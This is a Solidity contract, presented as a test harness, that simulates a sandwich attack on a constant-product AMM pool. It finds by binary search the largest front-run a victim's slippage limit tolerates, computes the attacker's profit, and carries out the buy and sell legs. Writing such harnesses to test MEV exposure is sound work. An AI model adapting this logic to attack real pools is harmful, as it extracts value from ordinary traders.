// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {ConstantProductPair} from "vendor/amm/ConstantProductPair.sol";

/// @title SandwichAttacker
/// @notice Test harness that plays the searcher: it sizes the largest front-run a pending victim swap tolerates,
///         buys first, and sells after the victim. The test contract plays the builder by ordering the three calls
///         [frontRun, victim swap, backRun] inside one transaction, which models an atomic bundle.
/// @dev Test-only. Sizing uses the pair's own `getAmountOut`, so the simulation is exact to the wei, not an estimate.
contract SandwichAttacker {
    using SafeERC20 for IERC20;

    ConstantProductPair public immutable pair;
    address public immutable owner;

    /// @notice Token spent in the open front-run (address(0) when no position is open).
    address public positionTokenIn;
    /// @notice Output bought in the open front-run, to be sold in the back-run.
    uint256 public positionAmountOut;

    error NotOwner();
    error PositionOpen();
    error NoPosition();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    /// @param pair_ The pool to attack.
    constructor(ConstantProductPair pair_) {
        pair = pair_;
        owner = msg.sender;
    }

    // ---------- simulation (what the searcher computes off-chain from the mempool) ----------

    /// @notice Victim output if the attacker front-runs with `frontRunIn` of `tokenIn` first.
    function victimOutAfter(address tokenIn, uint256 frontRunIn, uint256 victimIn) public view returns (uint256) {
        (uint256 reserveIn, uint256 reserveOut) = pair.getReservesFor(tokenIn);
        if (frontRunIn == 0) return pair.getAmountOut(victimIn, reserveIn, reserveOut);
        uint256 bought = pair.getAmountOut(frontRunIn, reserveIn, reserveOut);
        return pair.getAmountOut(victimIn, reserveIn + frontRunIn, reserveOut - bought);
    }

    /// @notice Largest front-run in [0, budget] that still leaves the victim at or above `victimMinOut`.
    /// @dev Victim output strictly falls as the front-run grows, so a binary search finds the exact boundary. The
    ///      attacker wants the boundary because a larger front-run moves the price more, and a victim revert would
    ///      kill the whole bundle. Returns 0 if the victim would revert even without an attack.
    function optimalFrontRun(address tokenIn, uint256 victimIn, uint256 victimMinOut, uint256 budget)
        external
        view
        returns (uint256)
    {
        if (victimOutAfter(tokenIn, 0, victimIn) < victimMinOut) return 0;
        uint256 lo = 0;
        uint256 hi = budget;
        while (lo < hi) {
            uint256 mid = lo + (hi - lo + 1) / 2;
            if (victimOutAfter(tokenIn, mid, victimIn) >= victimMinOut) lo = mid;
            else hi = mid - 1;
        }
        return lo;
    }

    /// @notice Attacker profit in `tokenIn` units for the full bundle [front-run, victim, back-run].
    /// @dev Signed, because in deep pools or against small victims the two legs' fees exceed the gain.
    function expectedProfit(address tokenIn, uint256 frontRunIn, uint256 victimIn) external view returns (int256) {
        if (frontRunIn == 0) return 0;
        (uint256 x, uint256 y) = pair.getReservesFor(tokenIn);
        uint256 bought = pair.getAmountOut(frontRunIn, x, y);
        x += frontRunIn;
        y -= bought;
        uint256 victimOut = pair.getAmountOut(victimIn, x, y);
        x += victimIn;
        y -= victimOut;
        uint256 back = pair.getAmountOut(bought, y, x);
        return SafeCast.toInt256(back) - SafeCast.toInt256(frontRunIn);
    }

    // ---------- execution (the two legs of the bundle) ----------

    /// @notice Leg 1: buy the victim's output token with `amountIn` of `tokenIn` held by this contract.
    function frontRun(address tokenIn, uint256 amountIn) external onlyOwner returns (uint256 bought) {
        if (positionTokenIn != address(0)) revert PositionOpen();
        IERC20(tokenIn).forceApprove(address(pair), amountIn);
        bought = pair.swapExactIn(tokenIn, amountIn, 0, address(this));
        positionTokenIn = tokenIn;
        positionAmountOut = bought;
    }

    /// @notice Leg 3: sell everything bought in leg 1 back into the original token.
    function backRun() external onlyOwner returns (uint256 amountBack) {
        address tokenIn = positionTokenIn;
        if (tokenIn == address(0)) revert NoPosition();
        uint256 amount = positionAmountOut;
        address tokenOut = tokenIn == address(pair.token0()) ? address(pair.token1()) : address(pair.token0());
        positionTokenIn = address(0);
        positionAmountOut = 0;
        IERC20(tokenOut).forceApprove(address(pair), amount);
        amountBack = pair.swapExactIn(tokenOut, amount, 0, address(this));
    }

    /// @notice Send the attacker's balance of `token` to the owner, so the test can measure realised profit.
    function withdraw(address token) external onlyOwner {
        IERC20(token).safeTransfer(owner, IERC20(token).balanceOf(address(this)));
    }
}
